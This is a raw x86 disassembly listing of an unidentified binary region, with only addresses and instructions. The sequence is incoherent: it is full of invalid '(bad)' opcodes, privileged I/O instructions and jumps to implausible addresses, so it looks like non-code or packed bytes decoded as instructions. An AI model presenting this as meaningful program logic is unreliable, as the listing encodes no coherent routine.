  41d522:	adc    eax,DWORD PTR [esp+0x52]
  41d526:	jo     0x41d4a8
  41d528:	inc    ebx
  41d529:	inc    esi
  41d52a:	mov    WORD PTR [edi],gs
  41d52c:	mov    ebx,DWORD PTR [esi]
  41d52e:	pushf  
  41d52f:	fisttp DWORD PTR [edi-0x11]
  41d532:	test   bl,ah
  41d534:	push   ebx
  41d535:	or     BYTE PTR [eax+0x2f],dh
  41d538:	call   0x413c3e
  41d53d:	loope  0x41d53b
  41d53f:	repz and BYTE PTR [edx],0x15
  41d543:	add    DWORD PTR [ecx-0x7517232a],ecx
  41d549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d54a:	in     al,0x3c
  41d54c:	sub    DWORD PTR [edx-0x69],ecx
  41d54f:	add    dh,BYTE PTR [ecx]
  41d551:	add    BYTE PTR ds:0x5a243927,bh
  41d557:	daa    
  41d558:	adc    al,0x0
  41d55a:	loope  0x41d4dd
  41d55c:	popf   
  41d55d:	add    BYTE PTR ds:0x42241139,ch
  41d563:	mov    bh,0x12
  41d565:	add    BYTE PTR [edx+ecx*4-0x53b9bc84],cl
  41d56c:	jl     0x41d543
  41d56e:	fnstenv [edi-0x77b9b48a]
  41d574:	jl     0x41d53d
  41d576:	or     bl,BYTE PTR [esi+0x43edff48]
  41d57c:	lds    esi,FWORD PTR [edx+0x59]
  41d57f:	aaa    
  41d580:	adc    al,0x0
  41d582:	loope  0x41d55c
  41d584:	int    0xe7
  41d586:	jne    0x41d561
  41d588:	data16 mov ds:0xe7ad5e70,al
  41d58e:	imul   ebx,DWORD PTR [esi-0x4b],0xe95e55e7
  41d595:	fsub   QWORD PTR [ecx]
  41d597:	std    
  41d598:	adc    DWORD PTR ds:0xe79d5f92,eax
  41d59e:	dec    ebp
  41d59f:	pop    esp
  41d5a0:	xor    ebx,DWORD PTR [eax]
  41d5a2:	push   esp
  41d5a3:	pop    esi
  41d5a4:	lods   eax,DWORD PTR ds:[esi]
  41d5a5:	out    0x79,eax
  41d5a7:	fs scas eax,DWORD PTR es:[edi]
  41d5a9:	neg    dl
  41d5ab:	fdivr  DWORD PTR [esi-0x15e39d3e]
  41d5b1:	xor    ebp,ebx
  41d5b3:	sbb    al,0xce
  41d5b5:	out    0x0,eax
  41d5b7:	and    al,0xd6
  41d5b9:	daa    
  41d5ba:	xor    al,0x6f
  41d5bc:	retf   
  41d5bd:	cmp    ecx,0xc866d925
  41d5c3:	imul   ebx,DWORD PTR [esi+0x2d],0x55b09de8
  41d5ca:	call   0x1814df3c
  41d5cf:	jle    0x41d5ca
  41d5d1:	retf   0x99f6
  41d5d4:	(bad)  
  41d5d5:	sub    DWORD PTR [ebx+eiz*8],eax
  41d5d8:	xchg   ebp,eax
  41d5d9:	in     eax,dx
  41d5da:	jl     0x41d57d
  41d5dc:	cmc    
  41d5dd:	aad    0x1d
  41d5df:	push   ecx
  41d5e0:	fs loope 0x41d617
  41d5e3:	jmp    0x41d56c
  41d5e5:	jo     0x41d5fd
  41d5e7:	(bad)  
  41d5e9:	jmp    0x5ef2e329
  41d5ee:	mov    bl,0xdc
  41d5f0:	adc    eax,0x8be0ebc6
  41d5f5:	xacquire xchg BYTE PTR [edx-0x50],ch
  41d5f9:	jp     0x41d58b
  41d5fb:	fisub  DWORD PTR [eax+eax*1+0x2166381]
  41d602:	jmp    0xfe66f266
  41d607:	xchg   edx,eax
  41d608:	divps  xmm0,xmm2
  41d60b:	out    0x9c,al
  41d60d:	ins    BYTE PTR es:[edi],dx
  41d60e:	sub    bl,dh
  41d610:	les    edx,FWORD PTR [edx+edi*4]
  41d613:	ds adc al,0x25
  41d616:	adc    DWORD PTR [ebp+0x62],ebp
  41d619:	ins    BYTE PTR es:[edi],dx
  41d61a:	add    eax,0x88068e00
  41d61f:	mov    esp,0xf2880661
  41d624:	and    bl,BYTE PTR [eax+0x54]
  41d627:	int    0x81
  41d629:	push   edi
  41d62a:	dec    esp
  41d62b:	lds    edi,FWORD PTR [ebp-0x27]
  41d62e:	cli    
  41d62f:	add    BYTE PTR [esi-0x50],al
  41d632:	sti    
  41d633:	jmp    0xf667c519
  41d638:	fsub   st(7),st
  41d63a:	add    ecx,ebp
  41d63c:	popa   
  41d63d:	arpl   WORD PTR [edx-0x18],cx
  41d640:	loope  0x41d5e9
  41d642:	xor    dh,bl
  41d644:	out    0xea,eax
  41d646:	add    ecx,ebp
  41d648:	popa   
  41d649:	pop    ecx
  41d64a:	stc    
  41d64b:	and    BYTE PTR [ebp+0x55],cl
  41d64e:	sub    al,0xe8
  41d650:	popa   
  41d651:	fnstcw WORD PTR [edi+0x45]
  41d654:	dec    edx
  41d655:	int3   
  41d656:	add    BYTE PTR [esp+ebx*4-0x52],dh
  41d65a:	mov    DWORD PTR ds:0x9987c83a,esp
  41d660:	test   eax,0x18c2011b
  41d665:	xor    BYTE PTR [edi],dh
  41d667:	int3   
  41d668:	jp     0x41d642
  41d66a:	sti    
  41d66b:	and    eax,0xd246cbfa
  41d670:	and    esp,DWORD PTR [esi]
  41d672:	out    dx,eax
  41d673:	xchg   edi,eax
  41d674:	stos   BYTE PTR es:[edi],al
  41d675:	cmc    
  41d676:	adc    al,0x0
  41d678:	or     cl,al
  41d67a:	sbb    al,0x2b
  41d67c:	(bad)
  41d67f:	push   eax
  41d680:	add    BYTE PTR [ebp+0x34],al
  41d683:	jo     0x41d6a9
  41d685:	stos   DWORD PTR es:[edi],eax
  41d686:	in     eax,0xfd
  41d688:	adc    eax,0x3ba59f
  41d68d:	cmp    BYTE PTR [ecx-0x113f00f9],ah
  41d693:	jecxz  0x41d67d
  41d695:	retf   
  41d696:	fild   DWORD PTR [eax]
  41d698:	and    BYTE PTR [edx],0x85
  41d69b:	outs   dx,BYTE PTR ds:[esi]
  41d69c:	add    al,0xa8
  41d69e:	ins    BYTE PTR es:[edi],dx
  41d69f:	call   0x255b19cf
  41d6a4:	xor    al,0x0
  41d6a6:	sbb    DWORD PTR ds:0x24f10e1c,esp
  41d6ac:	xor    al,0x45
  41d6ae:	and    DWORD PTR ds:0xee537b35,esp
  41d6b4:	sbb    eax,0xc889db8a
  41d6b9:	or     BYTE PTR [esi-0x6],bl
  41d6bc:	push   cs
  41d6bd:	call   FWORD PTR [esi]
  41d6bf:	cld    
  41d6c0:	(bad)  
  41d6c1:	jnp    0x41d665
  41d6c3:	inc    edi
  41d6c4:	and    al,0x23
  41d6c6:	mov    al,0x80
  41d6c8:	mov    ah,0x4b
  41d6ca:	fild   DWORD PTR [eax]
  41d6cc:	mov    edx,DWORD PTR [edi+0x378b1bc1]
  41d6d2:	jno    0x41d65c
  41d6d4:	ins    BYTE PTR es:[edi],dx
  41d6d5:	add    edi,edx
  41d6d7:	mov    DWORD PTR [edi+eiz*2-0x47],ecx
  41d6db:	sub    al,ch
  41d6dd:	cmp    BYTE PTR [ebx-0x78],dh
  41d6e0:	aad    0x23
  41d6e2:	pop    ebx
  41d6e3:	inc    ebp
  41d6e4:	add    DWORD PTR [eax],eax
  41d6e6:	or     esi,DWORD PTR [esp+esi*8]
  41d6e9:	test   esi,ebp
  41d6eb:	(bad)  
  41d6ec:	or     BYTE PTR [ebp-0x5e805014],al
  41d6f2:	(bad)  
  41d6f3:	sar    bh,0xff
  41d6f6:	jmp    0xb0e4d60
  41d6fb:	push   edi
  41d6fc:	jmp    0xd76dc500
  41d701:	mov    BYTE PTR [edx],bl
  41d703:	inc    esp
  41d704:	leave  
  41d705:	std    
  41d706:	popa   
  41d707:	pop    ecx
  41d708:	jl     0x41d755
  41d70a:	jle    0x41d6b8
  41d70c:	(bad)  
  41d70d:	sub    BYTE PTR [ebp+edx*8+0x77],dl
  41d711:	inc    ebx
  41d712:	jle    0x41d6e4
  41d714:	ja     0x41d6e8
  41d716:	jmp    0x7e8d53d3
  41d71b:	mov    eax,0x42bac776
  41d720:	dec    ecx
  41d721:	jmp    DWORD PTR [ebp+0x1673c03c]
  41d727:	cmp    esi,DWORD PTR [esp]
  41d72a:	push   edx
  41d72b:	sub    eax,DWORD PTR [edx]
  41d72d:	sub    DWORD PTR [esi],esp
  41d72f:	xchg   esp,eax
  41d730:	out    0x0,eax
  41d732:	xchg   edx,eax
  41d733:	fild   DWORD PTR [ebx]
  41d735:	mov    DWORD PTR [esi],edx
  41d737:	xchg   esp,eax
  41d738:	iret   
  41d739:	add    BYTE PTR [edi+0x6088da2c],0x3d
  41d740:	add    bh,BYTE PTR ds:[ecx]
  41d743:	add    edi,edi
  41d745:	add    BYTE PTR [edx+0x24443b],dh
  41d74b:	jp     0x41d73e
  41d74d:	add    esi,eax
  41d74f:	mov    dl,0x8f
  41d751:	rep ins BYTE PTR es:[di],dx
  41d754:	add    BYTE PTR ds:0x8c8c2681,al
  41d75a:	jae    0x41d7da
  41d75c:	mov    WORD PTR [esi+edx*2],?
  41d75f:	sub    eax,0xa2162b85
  41d764:	rol    BYTE PTR [eax-0x41c4913d],0xe7
  41d76b:	retf   0x2cd8
  41d76e:	add    esp,DWORD PTR [edx+0x62]
  41d771:	and    eax,0xe72171e8
  41d776:	xchg   ebx,eax
  41d777:	jmp    0x6f01:0xdcd3c614
  41d77e:	int3   
  41d77f:	sahf   
  41d780:	fidivr DWORD PTR [ecx+edi*2-0x3]
  41d784:	push   ss
  41d785:	scas   eax,DWORD PTR es:[edi]
  41d786:	xchg   esp,eax
  41d787:	outs   dx,BYTE PTR ds:[esi]
  41d788:	pop    ebx
  41d789:	cmp    al,0x8e
  41d78b:	(bad)  
  41d78c:	lods   eax,DWORD PTR ds:[esi]
  41d78d:	cdq    
  41d78e:	add    ebp,DWORD PTR [edi]
  41d790:	bsr    ebp,DWORD PTR [eax]
  41d793:	jecxz  0x41d729
  41d795:	std    
  41d796:	shr    DWORD PTR [ebp-0x27],0x17
  41d79a:	(bad)  
  41d79b:	retf   0x6eaa
  41d79e:	mov    ebp,0x2a524c5
  41d7a3:	(bad)
  41d7a8:	clc    
  41d7a9:	pop    esi
  41d7aa:	cmp    BYTE PTR [esi],bh
  41d7ac:	in     eax,0xb6
  41d7ae:	add    BYTE PTR ss:[esi+eax*1],dh
  41d7b2:	outs   dx,DWORD PTR ds:[esi]
  41d7b3:	adc    BYTE PTR [esi],bh
  41d7b5:	sbb    DWORD PTR [eax-0x39e31afb],eax
  41d7bb:	jmp    0x41d7a7
  41d7bd:	popf   
  41d7be:	sahf   
  41d7bf:	cwde   
  41d7c0:	dec    edi
  41d7c1:	bound  edi,QWORD PTR [eax-0x29d58d38]
  41d7c7:	enter  0x2553,0xd2
  41d7cb:	and    eax,0x25ee1aeb
  41d7d0:	adc    DWORD PTR ds:0xf0bfd006,0x2d
  41d7d7:	call   0xd937fd55
  41d7dc:	psubusw mm6,QWORD PTR [ebx-0x63d6ed38]
  41d7e3:	shl    ebp,1
  41d7e5:	or     al,0x1
  41d7e7:	pop    ss
  41d7e8:	dec    ebp
  41d7e9:	adc    al,BYTE PTR [eax+0x1c9b01a5]
  41d7ef:	jmp    0x8fc94526
  41d7f4:	test   BYTE PTR ds:0x53dac203,al
  41d7fa:	inc    esp
  41d7fb:	lds    ecx,FWORD PTR [ecx]
  41d7fd:	push   esp
  41d7fe:	push   esp
  41d7ff:	int    0xfd
  41d801:	push   ebx
  41d802:	ins    BYTE PTR es:[edi],dx
  41d803:	lds    esp,FWORD PTR [ecx-0x5f95f8db]
  41d809:	(bad)  
  41d80a:	xchg   DWORD PTR [ecx+edi*8+0x61e84611],edx
  41d811:	(bad)  
  41d812:	fdiv   DWORD PTR [edx+0x0]
  41d815:	sbb    eax,0x8d6014f5
  41d81a:	cmc    
  41d81b:	inc    esp
  41d81c:	bound  esp,QWORD PTR [ecx]
  41d81e:	icebp  
  41d81f:	xchg   DWORD PTR [ecx],eax
  41d821:	sub    ebp,esp
  41d823:	add    al,0x70
  41d825:	push   ebp
  41d826:	cmc    
  41d827:	and    al,0x60
  41d829:	and    eax,0xca6420f5
  41d82e:	sub    BYTE PTR [esi],dl
  41d830:	je     0x41d887
  41d832:	cmc    
  41d833:	inc    eax
  41d834:	ins    BYTE PTR es:[edi],dx
  41d835:	inc    ebp
  41d836:	cmc    
  41d837:	inc    esp
  41d838:	add    DWORD PTR [edx-0x53],edx
  41d83b:	sti    
  41d83c:	push   cs
  41d83d:	cli    
  41d83e:	aas    
  41d83f:	and    eax,0x250feaa9
  41d844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d845:	fdivr  QWORD PTR [edi-0x6f1b4e8c]
  41d84b:	or     esp,DWORD PTR [ebp-0x1f]
  41d84e:	stos   BYTE PTR es:[edi],al
  41d84f:	sti    
  41d850:	jmp    0x15670121
  41d855:	lds    esp,FWORD PTR [eax]
  41d857:	and    eax,0x2518baf5
  41d85c:	sub    DWORD PTR [esi+0x60],ebp
  41d85f:	inc    esp
  41d860:	add    BYTE PTR [edi-0x13],bl
  41d863:	push   eax
  41d864:	push   edi
  41d865:	in     al,0xc8
  41d867:	and    al,0x44
  41d869:	and    BYTE PTR [edi-0x1d],0xaa
  41d86d:	(bad)  
  41d86e:	pop    edi
  41d86f:	cld    
  41d870:	mov    esp,DWORD PTR [edi-0x447bc047]
  41d876:	scas   eax,DWORD PTR es:[edi]
  41d877:	jg     0x41d8cf
  41d879:	add    BYTE PTR [edx],cl
  41d87b:	fadd   DWORD PTR [eax]
  41d87d:	mov    esi,edi
  41d87f:	mov    edi,DWORD PTR [ebx]
  41d881:	jmp    0x41d882
  41d883:	sub    dh,BYTE PTR [eax+0x24]
  41d886:	scas   eax,DWORD PTR es:[edi]
  41d887:	stc    
  41d888:	cmp    DWORD PTR [edi+ebp*4-0x6d],0x7b3e0f03
  41d890:	sti    
  41d891:	(bad)  
  41d892:	mov    ebx,0xf8d3dcd
  41d897:	mov    WORD PTR [edi],fs
  41d899:	pop    ecx
  41d89a:	and    edi,DWORD PTR [edi]
  41d89c:	out    0xfe,al
  41d89e:	and    al,0x2c
  41d8a0:	dec    eax
  41d8a1:	and    al,0xc7
  41d8a3:	xor    BYTE PTR [eax+0x24],dl
  41d8a6:	push   ebx
  41d8a7:	dec    ebp
  41d8a8:	add    bl,BYTE PTR [edx+ecx*4]
  41d8ab:	xlat   BYTE PTR ds:[ebx]
  41d8ac:	mov    eax,edi
  41d8ae:	cwde   
  41d8af:	xchg   edi,eax
  41d8b0:	cmp    bh,0x42
  41d8b3:	mov    al,0x3f
  41d8b5:	clc    
  41d8b6:	adc    ah,cl
  41d8b8:	and    al,0x3c
  41d8ba:	push   cs
  41d8bb:	pusha  
  41d8bc:	or     al,0x88
  41d8be:	jp     0x41d894
  41d8c0:	add    BYTE PTR [eax],al
  41d8c2:	mov    al,ds:0x743824d3
  41d8c7:	push   edx
  41d8c8:	add    al,0x1
  41d8ca:	dec    ebx
  41d8cb:	xlat   BYTE PTR ds:[ebx]
  41d8cc:	mov    DWORD PTR [eax*2+0x3ffe3f8c],eax
  41d8d3:	aam    0x44
  41d8d5:	and    al,0x5b
  41d8d7:	sar    BYTE PTR [edi-0x1f039d77],cl
  41d8dd:	inc    ebx
  41d8de:	add    BYTE PTR [edi-0x79bc8576],ch
  41d8e4:	mov    WORD PTR [edx+0x47],?
  41d8e7:	push   0xffffff88
  41d8e9:	mov    esi,0x769ac063
  41d8ef:	jmp    0xa653706c
  41d8f4:	sar    edi,0x86
  41d8f7:	sahf   
  41d8f8:	xchg   esp,eax
  41d8f9:	mov    DWORD PTR [edx-0x2f844bde],0xfcffc062
  41d903:	ss push edx
  41d905:	jp     0x41d941
  41d907:	xchg   BYTE PTR [edx-0x5322ffc1],al
  41d90d:	(bad)  [edi]
  41d90f:	xor    bh,BYTE PTR [ebx]
  41d911:	scas   eax,DWORD PTR es:[edi]
  41d912:	mov    BYTE PTR [esi],ah
  41d914:	fdivr  QWORD PTR [ecx+eax*4]
  41d917:	sahf   
  41d918:	mov    esp,0xbfa4337a
  41d91d:	or     esp,DWORD PTR [edx+edi*2]
  41d920:	xor    dl,BYTE PTR gs:[esi-0x53]
  41d924:	retf   
  41d925:	jp     0x41d972
  41d927:	jle    0x41d991
  41d929:	jp     0x41d96e
  41d92b:	inc    esi
  41d92c:	add    BYTE PTR [edx+0x3c3766c3],0xc8
  41d933:	data16 daa 
  41d935:	xor    al,0x24
  41d937:	inc    edx
  41d938:	xchg   DWORD PTR [edi-0x2463da00],esi
  41d93e:	dec    esi
  41d93f:	adc    cl,BYTE PTR ds:0x12002dfc
  41d945:	shr    DWORD PTR [esi-0x206c0978],cl
  41d94b:	and    BYTE PTR [esi],0xb4
  41d94e:	jp     0x41d99a
  41d950:	call   0xe9d9:0x63c7afd8
  41d957:	jl     0x41d8f9
  41d959:	icebp  
  41d95a:	outs   dx,BYTE PTR ds:[esi]
  41d95b:	cmp    BYTE PTR [esi-0x15039f0f],al
  41d961:	sbb    al,0x6
  41d963:	inc    eax
  41d964:	in     eax,0x20
  41d966:	out    dx,al
  41d967:	jp     0x41d906
  41d969:	loope  0x41d90e
  41d96b:	inc    eax
  41d96c:	inc    esi
  41d96d:	shr    eax,1
  41d96f:	pushf  
  41d970:	jg     0x41d9c6
  41d972:	mov    cs,WORD PTR [edi]
  41d974:	inc    eax
  41d975:	pop    esi
  41d976:	jmp    0x41d9f4
  41d978:	(bad)  
  41d979:	aad    0xce
  41d97b:	xchg   ebx,eax
  41d97c:	call   0xfbeab5d
  41d981:	sar    DWORD PTR [ebp+eax*2-0x13],0xa9
  41d986:	outs   dx,BYTE PTR ds:[esi]
  41d987:	lods   al,BYTE PTR ds:[esi]
  41d988:	loopne 0x41d917
  41d98a:	cmc    
  41d98b:	cmp    al,0xeb
  41d98d:	sbb    BYTE PTR [esi-0x43],0xbd
  41d991:	and    eax,0x5e6203d2
  41d996:	push   ecx
  41d997:	jge    0x41d9ea
  41d999:	cmc    
  41d99a:	lods   eax,DWORD PTR ds:[esi]
  41d99b:	jl     0x41d9d6
  41d99d:	cmc    
  41d99e:	mov    eax,ds:0x27564f7c
  41d9a3:	push   es
  41d9a4:	arpl   WORD PTR [esi+ebp*2+0x6fbd00b9],ax
  41d9ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9ac:	add    ah,BYTE PTR [edx+0x55]
  41d9af:	sub    DWORD PTR [eax],edx
  41d9b1:	cmp    al,0x5e
  41d9b3:	loop   0x41d9b9
  41d9b5:	fs add al,0xb7
  41d9b8:	xor    eax,DWORD PTR [edi+0x3df1bdc3]
  41d9be:	fstp   DWORD PTR [esi-0xe]
  41d9c1:	jmp    0x1cd6:0x59c066d1
  41d9c8:	ret    0xd761
  41d9cb:	in     al,dx
  41d9cc:	jl     0x41da3c
  41d9ce:	lahf   
  41d9cf:	add    BYTE PTR [ebp+0x5c09a857],ch
  41d9d5:	mov    ebx,ds
  41d9d7:	mov    edi,esi
  41d9d9:	(bad)  
  41d9da:	xchg   ecx,eax
  41d9db:	call   0xfbea810a
  41d9e0:	arpl   WORD PTR [ebp-0x3],si
  41d9e3:	sbb    al,al
  41d9e5:	arpl   WORD PTR [edi-0x4b213905],sp
  41d9eb:	sub    al,0x1a
  41d9ed:	dec    ebp
  41d9ee:	wrmsr  
  41d9f0:	xchg   edx,eax
  41d9f1:	add    BYTE PTR ds:0x52530525,al
  41d9f7:	stc    
  41d9f8:	jo     0x41da37
  41d9fa:	std    
  41d9fb:	adc    al,0xe0
  41d9fd:	dec    edx
  41d9fe:	adc    DWORD PTR [edi+ebp*2],ecx
  41da01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41da03:	sti    
  41da04:	jmp    0x35cb7a1f
  41da09:	add    dh,ch
  41da0b:	xchg   esi,esi
  41da0d:	add    BYTE PTR [ebp+0x1a62f1da],bl
  41da13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da14:	jb     0x41d9f3
  41da16:	dec    eax
  41da17:	sub    al,0x25
  41da19:	and    eax,0xd3092edb
  41da1e:	mov    cl,0xc0
  41da20:	ficomp WORD PTR [edx-0x16]
  41da23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da24:	test   BYTE PTR [ecx],ch
  41da26:	stos   BYTE PTR es:[edi],al
  41da27:	pop    esp
  41da28:	outs   dx,DWORD PTR ds:[esi]
  41da29:	call   0xcfc9b38f
  41da2e:	lea    ebx,[ecx+0x64]
  41da31:	or     eax,0xc57ea87e
  41da36:	lods   eax,DWORD PTR ds:[esi]
  41da37:	les    eax,FWORD PTR [eax]
  41da39:	jb     0x41da76
  41da3b:	leave  
  41da3c:	jg     0x41da5a
  41da3e:	arpl   si,dx
  41da40:	jle    0x41d9e5
  41da42:	pusha  
  41da43:	fld    DWORD PTR [eax]
  41da45:	bound  ebx,QWORD PTR [ebp-0x3]
  41da48:	adc    al,0x0
  41da4a:	lock fadd QWORD PTR [ecx-0x7e5eba08]
  41da51:	repnz dec ebx
  41da53:	fadd   QWORD PTR [eax]
  41da55:	cmp    eax,DWORD PTR [esi+0x3bea84a1]
  41da5b:	fadd   QWORD PTR [eax]
  41da5d:	paddq  mm4,mm3
  41da60:	add    al,0xf6
  41da62:	or     ch,BYTE PTR [ecx-0x23147bf4]
  41da68:	add    BYTE PTR [eax],al
  41da6a:	mov    eax,0x850f0d55
  41da6f:	push   0xb00fffb
  41da74:	pop    ebx
  41da75:	mov    ebx,0x71b12fa
  41da7a:	pcmpeqd mm2,QWORD PTR [esp+edi*8]
  41da7e:	dec    DWORD PTR [ebx]
  41da80:	ret    0x5820
  41da83:	popa   
  41da84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da85:	cmc    
  41da86:	rol    DWORD PTR [edi],0xf5
  41da89:	or     eax,0x5f5bba45
  41da8e:	and    al,0xa7
  41da90:	fisttp DWORD PTR ds:0x50220bb7
  41da96:	and    al,0xb3
  41da98:	jmp    0x1993db03
  41da9d:	and    eax,0x38e83038
  41daa2:	push   0xffffffcb
  41daa4:	pop    esi
  41daa5:	imul   eax,DWORD PTR [eax+eax*2],0xffffffad
  41daa9:	xchg   BYTE PTR [ebx-0x4b],cl
  41daac:	inc    ebx
  41daad:	cdq    
  41daae:	add    BYTE PTR [eax+eiz*2-0x18],bl
  41dab2:	jge    0x41dab4
  41dab4:	lock cmp BYTE PTR [ebx+0x4c88a7ba],cl
  41dabb:	xchg   edi,eax
  41dabc:	mov    bl,0x28
  41dabe:	inc    ecx
  41dabf:	xchg   DWORD PTR [eax+eax*2],esp
  41dac2:	and    al,0x62
  41dac4:	xchg   BYTE PTR [eax+0x43],bh
  41dac7:	inc    esi
  41dac8:	mov    dh,0x2f
  41daca:	mov    ebx,DWORD PTR [esi]
  41dacc:	xchg   esi,eax
  41dacd:	fisttp DWORD PTR [edi-0x49]
  41dad0:	inc    ebx
  41dad1:	xor    BYTE PTR [ebx+0x7e],0x70
  41dad5:	xor    DWORD PTR [edi+0x0],ecx
  41dad8:	fld    st(7)
  41dada:	pushf  
  41dadb:	aam    0x46
  41dadd:	rol    BYTE PTR [edx+0x20d2283],0x46
  41dae4:	jmp    0x41daea
  41dae6:	loope  0x41dafb
  41dae8:	fld    st(4)
  41daea:	loopne 0x41db03
  41daec:	cmp    ch,BYTE PTR [eax+0x591dff41]
  41daf2:	(bad)  
  41daf3:	jg     0x41db57
  41daf5:	mov    al,0x1d
  41daf7:	and    DWORD PTR [ecx-0x26c0f444],0xffffffe7
  41dafe:	int3   
  41daff:	mov    BYTE PTR [esi-0x57c93464],ch
  41db05:	mov    ah,0x11
  41db07:	xor    ebx,ecx
  41db09:	cld    
  41db0a:	loopne 0x41db2f
  41db0c:	push   edi
  41db0d:	mov    al,0xdf
  41db0f:	(bad)  
  41db10:	fnsave ds:0xc67a240c
  41db16:	xor    al,0x87
  41db18:	es pushf 
  41db1a:	ror    DWORD PTR [eax-0x41294be0],cl
  41db20:	adc    al,BYTE PTR [edi]
  41db22:	adc    al,BYTE PTR [ecx+ebp*8]
  41db25:	mov    ds:0x18644878,al
  41db2a:	jecxz  0x41db2b
  41db2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db2d:	pop    ds
  41db2e:	ja     0x41dba3
  41db30:	inc    esi
  41db31:	mov    WORD PTR [esi-0x31],?
  41db34:	loope  0x41db20
  41db36:	add    al,0xd
  41db38:	fild   QWORD PTR [eax-0x7e]
  41db3b:	cld    
  41db3c:	add    BYTE PTR [ebp+0x62daced9],al
  41db42:	ret    0x8866
  41db45:	pop    edi
  41db46:	(bad)  
  41db47:	data16 add ch,BYTE PTR [edi-0x5a]
  41db4b:	or     al,BYTE PTR [edx+0x3e5fce9]
  41db51:	jmp    0x41db7f
  41db53:	(bad)  
  41db54:	retf   
  41db55:	iret   
  41db56:	out    0x5e,eax
  41db58:	cs pop edx
  41db5a:	xor    ebp,edx
  41db5c:	xchg   dh,cl
  41db5e:	aad    0xa0
  41db60:	fwait
  41db61:	cmp    cl,bl
  41db63:	jmp    0xe89e1003
  41db68:	add    ebx,ebx
  41db6a:	and    BYTE PTR [ecx+ebp*4-0x4f],0xc4
  41db6f:	ret    0x4610
  41db72:	lds    ebp,FWORD PTR [esi-0x4f]
  41db75:	push   ss
  41db76:	sub    eax,0x8fd4e00e
  41db7b:	jmp    0xea753d83
  41db80:	fwait
  41db81:	cmp    al,0x56
  41db83:	call   0x81d3c68b
  41db88:	data16 sub al,0xd8
  41db8b:	jmp    0xca3f7508
  41db90:	fwait
  41db91:	lock pop ss
  41db93:	jmp    0xe920a79b
  41db98:	cvtdq2ps xmm4,XMMWORD PTR [esi+0xedaf7f3]
  41db9f:	repnz fwait
  41dba1:	add    al,bl
  41dba3:	mov    dh,0x5a
  41dba5:	test   edx,ebp
  41dba7:	sbb    al,0xe
  41dba9:	(bad)  
  41dbab:	adc    al,0x6
  41dbad:	fsub   DWORD PTR [ebp+0x5a]
  41dbb0:	sub    ah,ch
  41dbb2:	in     al,0x1c
  41dbb4:	push   es
  41dbb5:	(bad)  
  41dbb7:	adc    al,0x1
  41dbb9:	or     eax,0xa143e0aa
  41dbbe:	mov    ss,WORD PTR [edi+0x50]
  41dbc1:	daa    
  41dbc2:	out    0xa4,eax
  41dbc4:	xchg   DWORD PTR [ebp+0x292fc995],edi
  41dbca:	inc    edi
  41dbcb:	loopne 0x41db8c
  41dbcd:	scas   eax,DWORD PTR es:[edi]
  41dbce:	jp     0x41dc35
  41dbd0:	pop    ebp
  41dbd1:	dec    BYTE PTR [ecx]
  41dbd3:	add    al,BYTE PTR [eax+0x529a3a25]
  41dbd9:	(bad)
  41dbde:	dec    ecx
  41dbdf:	mov    ebp,0xd9612848
  41dbe4:	xchg   DWORD PTR [edi],ebp
  41dbe6:	cs mov ebp,0xd9612840
  41dbec:	xchg   DWORD PTR [edi],ebx
  41dbee:	ds mov ebp,0xd9612838
  41dbf4:	xchg   DWORD PTR [edi],ebp
  41dbf6:	add    bh,BYTE PTR [ebp-0x269ed7d0]
  41dbfc:	xchg   DWORD PTR [edi],ebx
  41dbfe:	es mov ebp,0xd9612828
  41dc04:	xchg   DWORD PTR [edi],ebp
  41dc06:	add    BYTE PTR [esi],cl
  41dc08:	mov    ebp,0xd9612820
  41dc0d:	xchg   DWORD PTR [edi-0x79164937],ebx
  41dc13:	out    0x51,al
  41dc15:	dec    edx
  41dc16:	adc    eax,0xef749b55
  41dc1b:	nop
  41dc1c:	mov    cl,0xec
  41dc1e:	inc    edx
  41dc1f:	fisub  WORD PTR [ebp+0x5875e787]
  41dc25:	sti    
  41dc26:	aad    0xaf
  41dc28:	push   ecx
  41dc29:	retf   
  41dc2a:	inc    ecx
  41dc2b:	and    cl,BYTE PTR [eax-0x5]
  41dc2e:	dec    esi
  41dc2f:	sub    dl,BYTE PTR [ebp+0x185c00e8]
  41dc35:	cld    
  41dc36:	call   DWORD PTR [eax]
  41dc38:	out    dx,al
  41dc39:	inc    esp
  41dc3a:	pop    edi
  41dc3b:	cmp    al,0xe6
  41dc3d:	inc    eax
  41dc3e:	or     bl,bl
  41dc40:	sbb    BYTE PTR [ecx],al
  41dc42:	pop    esi
  41dc43:	push   edx
  41dc44:	inc    esi
  41dc45:	cmp    eax,DWORD PTR [ecx]
  41dc47:	mov    ebx,DWORD PTR [ecx-0x19]
  41dc4a:	ins    BYTE PTR es:[edi],dx
  41dc4b:	test   al,0xf3
  41dc4d:	push   edx
  41dc4e:	mov    ecx,DWORD PTR [edi]
  41dc50:	test   BYTE PTR [ebx+0x0],bh
  41dc53:	dec    ebx
  41dc54:	fcom   DWORD PTR [ebp-0x77]
  41dc57:	out    dx,eax
  41dc58:	adc    DWORD PTR [edi],0xffffff89
  41dc5b:	pop    es
  41dc5c:	test   BYTE PTR [edi],ah
  41dc5e:	xor    DWORD PTR ds:0xc4fffc58,0x480185c8
  41dc68:	fadd   DWORD PTR [eax]
  41dc6a:	mov    eax,DWORD PTR [eax]
  41dc6c:	mov    edi,0x3b0080f1
  41dc71:	fdiv   DWORD PTR [ecx]
  41dc73:	fist   DWORD PTR [esi+0x184c1f81]
  41dc79:	adc    eax,0xb55f5c83
  41dc7e:	add    BYTE PTR [edi+ebx*2-0x57],0x82
  41dc83:	je     0x41dcb4
  41dc85:	test   al,0x82
  41dc87:	pop    esp
  41dc88:	pop    ds
  41dc89:	lods   al,BYTE PTR ds:[esi]
  41dc8a:	jecxz  0x41dc4c
  41dc8c:	fst    DWORD PTR [esi-0x4]
  41dc8f:	lea    ebp,[edi]
  41dc91:	icebp  
  41dc92:	xor    BYTE PTR [edx-0x37],ch
  41dc95:	test   bl,ah
  41dc97:	mov    ah,0xe9
  41dc99:	push   esi
  41dc9a:	cld    
